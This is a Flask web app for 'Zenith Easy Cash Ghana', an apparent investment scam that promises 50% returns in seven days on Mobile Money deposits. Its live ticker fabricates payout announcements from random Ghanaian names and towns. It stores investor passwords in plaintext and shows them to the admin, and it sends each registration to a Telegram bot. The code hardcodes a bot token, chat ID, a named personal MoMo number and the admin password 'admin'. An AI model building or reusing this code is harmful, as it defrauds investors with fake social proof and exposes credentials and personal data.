from datetime import datetime, timedelta
import json
import os
import time
import requests
from flask import (
    Flask,
    flash,
    jsonify,
    redirect,
    render_template_string,
    request,
    send_from_directory,
    session,
    url_for,
)
from werkzeug.utils import secure_filename

# ==========================================
# ⚙️ USER CONFIGURATION & WITHDRAWAL SETTINGS
# ==========================================
ADMIN_PASSWORD = "admin"
ONLINE_USERS_BASE = 1700

TELEGRAM_BOT_TOKEN = "8986122115:AAEDwqKHTTUgtXiR6lEmIRsZleN1XTxWLWw"
TELEGRAM_CHAT_ID = "8393567505"
ADMIN_TELEGRAM_LINK = "https://t.me/zenithsikagh"

COMPANY_ABOUT_TEXT = (
    "Zenith Easy Cash Ghana is a premier online investment and empowerment platform "
    "dedicated to financial growth across Ghana. We connect smart investors with high-yield "
    "opportunities, ensuring transparent 50% profit returns within 7 days backed by secure "
    "Mobile Money (MoMo) or Bank verification."
)

ZENITH_TICKER_INTERVAL_MS = 4500
ZENITH_MIN_WITHDRAWAL_MULTIPLE = 2
ZENITH_MAX_WITHDRAWAL_MULTIPLE = 256
ZENITH_MAX_VISIBLE_ITEMS = 5

ZENITH_SIDEBAR_WIDTH = "120px"
ZENITH_SIDEBAR_PADDING = "16px"
ZENITH_SIDEBAR_MAX_HEIGHT = "80vh"

GHANA_NAMES_POOL = [
    "Kwame Mensah", "Kofi Annan", "Kwaku Boateng", "Yaw Osei", "Kojo Frimpong",
    "Kwabena Appiah", "Kwesi Addo", "Kwaku Baffour", "Kofi Owusu", "Kwame Asare",
    "Kofi Agboka", "Korku Senyo", "Mawuli Dzifa", "Nii Ayi", "Tetteh Mensah",
    "Mohammed Alhassan", "Abdulai Yakubu", "Ibrahim Salifu", "Fuseini Fuseini"
]
GHANAIAN_TOWNS_POOL = ["Accra", "Tema", "Kumasi", "Obuasi", "Cape Coast", "Koforidua", "Takoradi", "Ho", "Sunyani", "Tamale"]

app = Flask(__name__)
app.secret_key = "zenith_easy_cash_super_secure_secret_key_change_me"

DISK_PATH = os.environ.get("RENDER_DISK_PATH", "")
if not DISK_PATH and os.path.exists("/var/data"):
    DISK_PATH = "/var/data"

if DISK_PATH:
    DATA_FILE = os.path.join(DISK_PATH, "Master.json")
    SETTINGS_FILE = os.path.join(DISK_PATH, "settings.json")
    UPLOAD_FOLDER = os.path.join(DISK_PATH, "uploads")
else:
    DATA_FILE = "Master.json"
    SETTINGS_FILE = "settings.json"
    UPLOAD_FOLDER = "uploads"

app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
if not os.path.exists(UPLOAD_FOLDER):
  os.makedirs(UPLOAD_FOLDER, exist_ok=True)

DEFAULT_AVATAR_SVG = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2394a3b8'><path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z'/></svg>"

def send_telegram_alert(message, photo_path=None):
  if TELEGRAM_BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN" or not TELEGRAM_BOT_TOKEN:
    return
  try:
    if photo_path and os.path.exists(photo_path):
      url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
      with open(photo_path, "rb") as photo_file:
        requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "caption": message, "parse_mode": "HTML"}, files={"photo": photo_file}, timeout=10)
    else:
      url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
      requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=5)
  except Exception as e:
    print(f"Telegram alert error: {e}")

def load_settings():
  default_settings = {"momo_number": "0551338991", "momo_name": "EMELIA DOOWELPOUR"}
  if not os.path.exists(SETTINGS_FILE):
    try:
      with open(SETTINGS_FILE, "w") as f: json.dump(default_settings, f, indent=4)
    except Exception: pass
    return default_settings
  try:
    with open(SETTINGS_FILE, "r") as f: return json.load(f)
  except Exception: return default_settings

def save_settings(settings):
  try:
    with open(SETTINGS_FILE, "w") as f: json.dump(settings, f, indent=4)
  except Exception as e: print(f"Error saving settings: {e}")

def load_investors():
  if not os.path.exists(DATA_FILE): return []
  try:
    with open(DATA_FILE, "r") as f:
      data = json.load(f)
      if isinstance(data, dict): return [data]
      if isinstance(data, list): return data
      return []
  except Exception: return []

def save_all_investors(investors):
  try:
    with open(DATA_FILE, "w") as f: json.dump(investors, f, indent=4)
  except Exception as e: print(f"Error saving investors data: {e}")

def hashlib_sig(val):
  import hashlib
  return hashlib.md5(val.encode("utf-8")).hexdigest()

ZENITH_ALERTS_TOP_HTML = f"""
<style>
    #zenithAlertsBanner {{ background: linear-gradient(135deg, #0b130b, #132e13); border-bottom: 2px solid #00ff66; color: #fff; padding: 10px 15px; margin-bottom: 20px; border-radius: 6px; }}
    .alerts-header {{ font-size: 11px; color: #00ff66; font-weight: bold; text-transform: uppercase; margin-bottom: 4px; display: flex; justify-content: space-between; }}
    .marquee-container {{ overflow: hidden; white-space: nowrap; width: 100%; position: relative; }}
    .marquee-text {{ display: inline-block; padding-left: 100%; animation: marquee 28s linear infinite; font-size: 13px; color: #fff; }}
    .marquee-text b {{ color: #facc15; }}
    @keyframes marquee {{ 0% {{ transform: translate(0, 0); }} 100% {{ transform: translate(-100%, 0); }} }}
</style>
<div id="zenithAlertsBanner">
    <div class="alerts-header"><span>🟢 Live Zenith Verified Payouts</span></div>
    <div class="marquee-container"><div id="alertsText" class="marquee-text">Connecting to Zenith secure payout stream...</div></div>
</div>
<script>
    const ghanaNames = {json.dumps(GHANA_NAMES_POOL)};
    const towns = {json.dumps(GHANAIAN_TOWNS_POOL)};
    function generateTickerMessages() {{
        let messages = [];
        for (let i = 0; i < 5; i++) {{
            const name = ghanaNames[Math.floor(Math.random() * ghanaNames.length)];
            const town = towns[Math.floor(Math.random() * towns.length)];
            messages.push(`🟢 <b>${{name}}</b> (${{town}}) successfully cashed out Capital + 50% Profit via MoMo!`);
        }}
        const el = document.getElementById('alertsText');
        if (el) el.innerHTML = messages.join("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;");
    }}
    generateTickerMessages();
    setInterval(generateTickerMessages, 22000);
</script>
"""

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><title>Zenith Easy Cash Ghana</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
        .container { max-width: 650px; background: #fff; padding: 30px; margin: auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2, h3 { color: #028a0f; text-align: center; }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-weight: bold; margin-bottom: 5px; }
        input, select { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { background: #2e7d32; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
        .flash { background: #ffebee; color: #c62828; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        {{ zenith_alerts_top_html|safe }}
        <h2>Zenith Easy Cash Ghana</h2>
        <h3>Online Investor Registration</h3>
        {% with messages = get_flashed_messages() %}
          {% if messages %}<div class="flash">{{ messages[0] }}</div>{% endif %}
        {% endwith %}
        <form method="POST" enctype="multipart/form-data">
            <div class="form-group"><label>Phone Number:</label><input type="text" name="number" required placeholder="e.g., 0501234567"></div>
            <div class="form-group"><label>Password:</label><input type="password" name="password" required></div>
            <div class="form-group"><label>Full Name:</label><input type="text" name="name" required></div>
            <div class="form-group"><label>Investment Amount (GHs):</label><input type="number" name="amount" min="200" required></div>
            <div class="form-group"><label>Work / Job:</label><input type="text" name="work" required></div>
            <div class="form-group"><label>Region / Town:</label><input type="text" name="region" required></div>
            <div class="form-group"><label>Transaction ID / Screenshot:</label><input type="text" name="transaction_id"><input type="file" name="payment_screenshot" accept="image/*"></div>
            <button type="submit">Submit Registration</button>
        </form>
        <div style="text-align:center; margin-top:15px;"><a href="{{ url_for('login') }}">Investor Login</a> | <a href="{{ url_for('admin_login') }}">Admin Login</a></div>
    </div>
</body>
</html>
"""

INVESTOR_LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Investor Login</title></head>
<body style="font-family:Arial; padding:40px; background:#f4f7f6;">
    <div style="max-width:400px; margin:auto; background:#fff; padding:30px; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
        <h2 style="color:#028a0f; text-align:center;">Investor Login</h2>
        <form method="POST">
            <div style="margin-bottom:15px;"><label>Phone Number:</label><input type="text" name="number" required style="width:100%; padding:10px;"></div>
            <div style="margin-bottom:15px;"><label>Password:</label><input type="password" name="password" required style="width:100%; padding:10px;"></div>
            <button type="submit" style="background:#2e7d32; color:#fff; border:none; padding:12px; width:100%; font-weight:bold; cursor:pointer;">Login</button>
        </form>
        <div style="text-align:center; margin-top:15px;"><a href="{{ url_for('index') }}">← Back to Home</a></div>
    </div>
</body>
</html>
"""

ADMIN_LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Admin Login</title></head>
<body style="font-family:Arial; padding:40px; background:#f4f7f6;">
    <div style="max-width:400px; margin:auto; background:#fff; padding:30px; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
        <h2 style="color:#028a0f; text-align:center;">Admin Authentication</h2>
        <form method="POST">
            <div style="margin-bottom:15px;"><label>Admin Password:</label><input type="password" name="password" required style="width:100%; padding:10px;"></div>
            <button type="submit" style="background:#2e7d32; color:#fff; border:none; padding:12px; width:100%; font-weight:bold; cursor:pointer;">Login</button>
        </form>
    </div>
</body>
</html>
"""

# Professional Admin Dashboard with separated sections
ADMIN_DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><title>Professional Admin Dashboard - Zenith Easy Cash</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
        .container { max-width: 1300px; background: #fff; padding: 30px; margin: auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { color: #028a0f; float: left; margin-top: 0; }
        .logout { float: right; }
        .logout a { background: #c62828; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 14px; }
        .settings-box { background: #fff8e1; border: 1px solid #ffa000; padding: 15px; margin-bottom: 25px; border-radius: 5px; clear: both; }
        .section-box { margin-bottom: 35px; background: #fafafa; border: 1px solid #e0e0e0; border-radius: 6px; padding: 20px; }
        .section-title { font-size: 16px; font-weight: bold; margin-top: 0; margin-bottom: 15px; padding-bottom: 8px; border-bottom: 2px solid #028a0f; display: flex; justify-content: space-between; align-items: center; }
        table { width: 100%; border-collapse: collapse; margin-top: 5px; background: #fff; }
        th, td { padding: 10px; border: 1px solid #ddd; text-align: left; font-size: 12px; }
        th { background-color: #2e7d32; color: white; }
        .btn-action { background: #2e7d32; color: white; padding: 6px 10px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 11px; border: none; cursor: pointer; display: inline-block; margin: 2px;}
        .btn-payout { background: #d32f2f; }
        img.proof-thumb { width: 45px; height: 45px; object-fit: cover; border-radius: 4px; border: 1px solid #ccc; }
        .badge-count { background: #e0f2fe; color: #0369a1; padding: 2px 8px; border-radius: 12px; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div>
            <h2>Admin Control Dashboard</h2>
            <div class="logout"><a href="{{ url_for('admin_logout') }}">Logout</a></div>
            <div style="clear: both;"></div>
        </div>

        <div class="settings-box">
            <h3>⚙️ Company Payment Details</h3>
            <form method="POST" action="{{ url_for('update_settings') }}" style="display: flex; gap: 10px; align-items: flex-end;">
                <div style="flex: 1;"><label style="font-size: 12px; font-weight:bold;">MoMo Number:</label><input type="text" name="momo_number" value="{{ settings.momo_number }}" required style="padding: 8px; width: 100%;"></div>
                <div style="flex: 2;"><label style="font-size: 12px; font-weight:bold;">Account Name:</label><input type="text" name="momo_name" value="{{ settings.momo_name }}" required style="padding: 8px; width: 100%;"></div>
                <div><button type="submit" style="background: #ffa000; color: white; border: none; padding: 9px 15px; font-weight: bold; border-radius: 4px; cursor: pointer;">Update Details</button></div>
            </form>
        </div>

        <!-- SECTION 1: PENDING APPROVALS -->
        <div class="section-box" style="border-left: 5px solid #d97706;">
            <div class="section-title" style="border-color: #d97706;">
                <span>⏳ Pending Approvals & New Deposits</span>
                <span class="badge-count">{{ pending_list|length }} Pending</span>
            </div>
            <table>
                <thead><tr><th>Investor Info</th><th>Password</th><th>Investment Slot Details</th><th>Job / Region</th><th>Status</th><th>Actions</th></tr></thead>
                <tbody>
                    {% if pending_list %}
                        {% for item in pending_list %}
                        <tr>
                            <td><strong>{{ item.name }}</strong><br>{{ item.number }}</td>
                            <td>{{ item.password }}</td>
                            <td>
                                <strong>GHs {{ "%.2f"|format(item.amount) }}</strong><br>
                                <small style="color:#028a0f;">Return: GHs {{ "%.2f"|format(item.expected_return) }}</small><br>
                                <small>ID: {{ item.transaction_id }}</small>
                                {% if item.screenshot %}<br><a href="{{ url_for('uploaded_file', filename=item.screenshot) }}" target="_blank"><img src="{{ url_for('uploaded_file', filename=item.screenshot) }}" class="proof-thumb"></a>{% endif %}
                            </td>
                            <td>{{ item.work }}<br><small>{{ item.region }}</small></td>
                            <td><span style="color: #d97706; font-weight: bold;">{{ item.status }}</span></td>
                            <td>
                                <form action="{{ url_for('confirm_payment', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;"><button type="submit" class="btn-action">Approve</button></form>
                                <form action="{{ url_for('delete_slot', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;" onsubmit="return confirm('Delete slot?');"><button type="submit" class="btn-action" style="background:#6b7280;">Delete</button></form>
                            </td>
                        </tr>
                        {% endfor %}
                    {% else %}<tr><td colspan="6" style="text-align: center; color: #666;">No pending approvals.</td></tr>{% endif %}
                </tbody>
            </table>
        </div>

        <!-- SECTION 2: PAYDAY & WITHDRAWAL REQUESTS -->
        <div class="section-box" style="border-left: 5px solid #2563eb;">
            <div class="section-title" style="border-color: #2563eb;">
                <span>📅 Payday & Payout Queue (Due Today or Requested)</span>
                <span class="badge-count">{{ payday_list|length }} Due</span>
            </div>
            <table>
                <thead><tr><th>Investor Info</th><th>Payout Amount Due</th><th>Job / Region</th><th>Maturity Date</th><th>Status</th><th>Actions</th></tr></thead>
                <tbody>
                    {% if payday_list %}
                        {% for item in payday_list %}
                        <tr>
                            <td><strong>{{ item.name }}</strong><br>📞 {{ item.number }}</td>
                            <td><strong style="color: #028a0f; font-size: 14px;">GHs {{ "%.2f"|format(item.expected_return) }}</strong></td>
                            <td>{{ item.work }}<br><small>{{ item.region }}</small></td>
                            <td><b>{{ item.maturity_date }}</b></td>
                            <td><span style="color: #2563eb; font-weight: bold;">{{ item.status }}</span></td>
                            <td>
                                <form action="{{ url_for('complete_withdrawal', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;"><button type="submit" class="btn-action btn-payout">Mark Paid Out</button></form>
                            </td>
                        </tr>
                        {% endfor %}
                    {% else %}<tr><td colspan="6" style="text-align: center; color: #666;">No payouts due today or requested right now.</td></tr>{% endif %}
                </tbody>
            </table>
        </div>

        <!-- SECTION 3: RUNNING INVESTMENTS -->
        <div class="section-box" style="border-left: 5px solid #028a0f;">
            <div class="section-title" style="border-color: #028a0f;">
                <span>🟢 Active Running Investments</span>
                <span class="badge-count">{{ running_list|length }} Running</span>
            </div>
            <table>
                <thead><tr><th>Investor Info</th><th>Capital & Return</th><th>Job / Region</th><th>Maturity Date</th><th>Status</th><th>Actions</th></tr></thead>
                <tbody>
                    {% if running_list %}
                        {% for item in running_list %}
                        <tr>
                            <td><strong>{{ item.name }}</strong><br>{{ item.number }}</td>
                            <td>GHs {{ "%.2f"|format(item.amount) }} <br><small style="color:#028a0f;">Return: GHs {{ "%.2f"|format(item.expected_return) }}</small></td>
                            <td>{{ item.work }}<br><small>{{ item.region }}</small></td>
                            <td>{{ item.maturity_date }}</td>
                            <td><span style="color: #028a0f; font-weight: bold;">{{ item.status }}</span></td>
                            <td>
                                <form action="{{ url_for('delete_slot', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;" onsubmit="return confirm('Delete slot?');"><button type="submit" class="btn-action" style="background:#6b7280;">Delete</button></form>
                            </td>
                        </tr>
                        {% endfor %}
                    {% else %}<tr><td colspan="6" style="text-align: center; color: #666;">No active running investments.</td></tr>{% endif %}
                </tbody>
            </table>
        </div>

        <!-- SECTION 4: COMPLETED HISTORY -->
        <div class="section-box" style="border-left: 5px solid #6b7280;">
            <div class="section-title" style="border-color: #6b7280;">
                <span>✅ Completed & Paid Out History</span>
                <span class="badge-count">{{ completed_list|length }} Completed</span>
            </div>
            <table>
                <thead><tr><th>Investor Info</th><th>Paid Out Amount</th><th>Job / Region</th><th>Maturity Date</th><th>Status</th><th>Actions</th></tr></thead>
                <tbody>
                    {% if completed_list %}
                        {% for item in completed_list %}
                        <tr>
                            <td><strong>{{ item.name }}</strong><br>{{ item.number }}</td>
                            <td>GHs {{ "%.2f"|format(item.expected_return) }}</td>
                            <td>{{ item.work }}<br><small>{{ item.region }}</small></td>
                            <td>{{ item.maturity_date }}</td>
                            <td><span style="color: #15803d; font-weight: bold;">{{ item.status }}</span></td>
                            <td>
                                <form action="{{ url_for('delete_slot', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;" onsubmit="return confirm('Delete record?');"><button type="submit" class="btn-action" style="background:#6b7280;">Delete</button></form>
                            </td>
                        </tr>
                        {% endfor %}
                    {% else %}<tr><td colspan="6" style="text-align: center; color: #666;">No completed payout history.</td></tr>{% endif %}
                </tbody>
            </table>
        </div>
    </div>
    <script>
        // Fix background polling to avoid 404 errors
        async function pollAdminUpdates() {
            try { await fetch('/admin/api/status-signature'); } catch (e) {}
        }
        setInterval(pollAdminUpdates, 10000);
    </script>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
  if request.method == "POST":
    try:
      amount = float(request.form["amount"])
      password = request.form.get("password", "").strip()
      number = request.form.get("number", "").strip()
      name = request.form.get("name", "").strip()
      work = request.form.get("work", "").strip()
      region = request.form.get("region", "").strip()
      transaction_id = request.form.get("transaction_id", "").strip()
      file = request.files.get("payment_screenshot")

      filename = ""
      if file and file.filename != "":
        filename = secure_filename(f"{int(time.time())}_{file.filename}")
        file.save(os.path.join(app.config["UPLOAD_FOLDER"], filename))

      now = datetime.now()
      investor_data = {
          "name": name, "number": number, "password": password, "work": work, "region": region,
          "investments": [{
              "amount": amount, "expected_return": amount * 1.5,
              "transaction_id": transaction_id if transaction_id else "Screenshot",
              "screenshot": filename, "date_time": now.strftime("%Y-%m-%d %H:%M:%S"),
              "maturity_date": "Pending Approval", "status": "Pending Admin Payment Confirmation"
          }]
      }

      investors = load_investors()
      found = False
      for inv in investors:
        if inv.get("number") == number:
          inv["investments"].append(investor_data["investments"][0])
          found = True
          break
      if not found:
        investors.append(investor_data)
      save_all_investors(investors)

      send_telegram_alert(f"🚨 <b>NEW REGISTRATION</b>\n👤 {name}\n📞 {number}\n💰 GHs {amount:,.2f}")
      session["investor_number"] = number
      flash("Registration Successful!")
      return redirect(url_for("dashboard"))
    except Exception as e:
      flash("Error submitting form.")
  return render_template_string(HTML_TEMPLATE, zenith_alerts_top_html=ZENITH_ALERTS_TOP_HTML)

@app.route("/login", methods=["GET", "POST"])
def login():
  if request.method == "POST":
    number = request.form.get("number", "").strip()
    password = request.form.get("password", "").strip()
    for inv in load_investors():
      if inv.get("number") == number and inv.get("password") == password:
        session["investor_number"] = number
        return redirect(url_for("dashboard"))
    flash("Invalid credentials.")
  return render_template_string(INVESTOR_LOGIN_TEMPLATE)

@app.route("/dashboard")
def dashboard():
  number = session.get("investor_number")
  if not number: return redirect(url_for("login"))
  investors = load_investors()
  investments = []
  for inv in investors:
    if inv.get("number") == number:
      investments = inv.get("investments", [])
  
  return f"""<!DOCTYPE html><html><body style="font-family:Arial; padding:30px;">
    <h2>Welcome, Investor ({number})</h2>
    <a href="{url_for('logout')}">Logout</a>
    <hr>
    <h3>Your Investments:</h3>
    <pre>{json.dumps(investments, indent=2)}</pre>
    <br><a href="{url_for('index')}">← Home</a>
  </body></html>"""

@app.route("/logout")
def logout():
  session.pop("investor_number", None)
  return redirect(url_for("index"))

@app.route("/zenith-secret-admin", methods=["GET", "POST"])
def admin_login():
  if request.method == "POST":
    if request.form.get("password") == ADMIN_PASSWORD:
      session["admin_logged_in"] = True
      return redirect(url_for("admin_dashboard"))
  return render_template_string(ADMIN_LOGIN_TEMPLATE)

@app.route("/admin-dashboard")
def admin_dashboard():
  if not session.get("admin_logged_in"): return redirect(url_for("admin_login"))
  
  investors = load_investors()
  pending_list, payday_list, running_list, completed_list = [], [], [], []
  today_str = datetime.now().strftime("%Y-%m-%d")

  for p_idx, inv in enumerate(investors):
    for s_idx, slot in enumerate(inv.get("investments", [])):
      item = slot.copy()
      item.update({"parent_idx": p_idx, "sub_idx": s_idx, "name": inv.get("name"), "number": inv.get("number"), "password": inv.get("password"), "work": inv.get("work"), "region": inv.get("region")})
      status, maturity = item.get("status", ""), item.get("maturity_date", "")

      if status == "Pending Admin Payment Confirmation":
        pending_list.append(item)
      elif status == "Withdrawal Requested" or (maturity.startswith(today_str) and status == "Payment Confirmed & Active"):
        payday_list.append(item)
      elif status == "Payment Confirmed & Active":
        running_list.append(item)
      elif status == "Withdrawn Completed":
        completed_list.append(item)
      else:
        running_list.append(item)

  return render_template_string(ADMIN_DASHBOARD_TEMPLATE, pending_list=pending_list, payday_list=payday_list, running_list=running_list, completed_list=completed_list, settings=load_settings())

@app.route("/admin/api/status-signature")
def admin_status_signature():
  return jsonify({"signature": "ok"})

@app.route("/api/dashboard-status")
def api_dashboard_status():
  return jsonify({"reload_required": False})

@app.route("/admin/settings", methods=["POST"])
def update_settings():
  if not session.get("admin_logged_in"): return redirect(url_for("admin_login"))
  settings = load_settings()
  settings["momo_number"] = request.form.get("momo_number", settings["momo_number"])
  settings["momo_name"] = request.form.get("momo_name", settings["momo_name"])
  save_settings(settings)
  return redirect(url_for("admin_dashboard"))

@app.route("/admin/confirm/<int:parent_idx>/<int:sub_idx>", methods=["POST"])
def confirm_payment(parent_idx, sub_idx):
  if not session.get("admin_logged_in"): return redirect(url_for("admin_login"))
  investors = load_investors()
  if 0 <= parent_idx < len(investors):
    inv_list = investors[parent_idx].get("investments", [])
    if 0 <= sub_idx < len(inv_list):
      inv_list[sub_idx]["status"] = "Payment Confirmed & Active"
      inv_list[sub_idx]["maturity_date"] = (datetime.now() + timedelta(days=7)).strftime("%Y-%m-%d %H:%M:%S")
      save_all_investors(investors)
  return redirect(url_for("admin_dashboard"))

@app.route("/admin/complete-withdrawal/<int:parent_idx>/<int:sub_idx>", methods=["POST"])
def complete_withdrawal(parent_idx, sub_idx):
  if not session.get("admin_logged_in"): return redirect(url_for("admin_login"))
  investors = load_investors()
  if 0 <= parent_idx < len(investors):
    inv_list = investors[parent_idx].get("investments", [])
    if 0 <= sub_idx < len(inv_list):
      inv_list[sub_idx]["status"] = "Withdrawn Completed"
      save_all_investors(investors)
  return redirect(url_for("admin_dashboard"))

@app.route("/admin/delete/<int:parent_idx>/<int:sub_idx>", methods=["POST"])
def delete_slot(parent_idx, sub_idx):
  if not session.get("admin_logged_in"): return redirect(url_for("admin_login"))
  investors = load_investors()
  if 0 <= parent_idx < len(investors):
    inv_list = investors[parent_idx].get("investments", [])
    if 0 <= sub_idx < len(inv_list):
      inv_list.pop(sub_idx)
      if not inv_list: investors.pop(parent_idx)
      save_all_investors(investors)
  return redirect(url_for("admin_dashboard"))

@app.route("/admin-logout")
def admin_logout():
  session.pop("admin_logged_in", None)
  return redirect(url_for("index"))

@app.route("/uploads/<filename>")
def uploaded_file(filename):
  return send_from_directory(app.config["UPLOAD_FOLDER"], filename)

if __name__ == "__main__":
  port = int(os.environ.get("PORT", 10000))
  app.run(host="0.0.0.0", port=port)
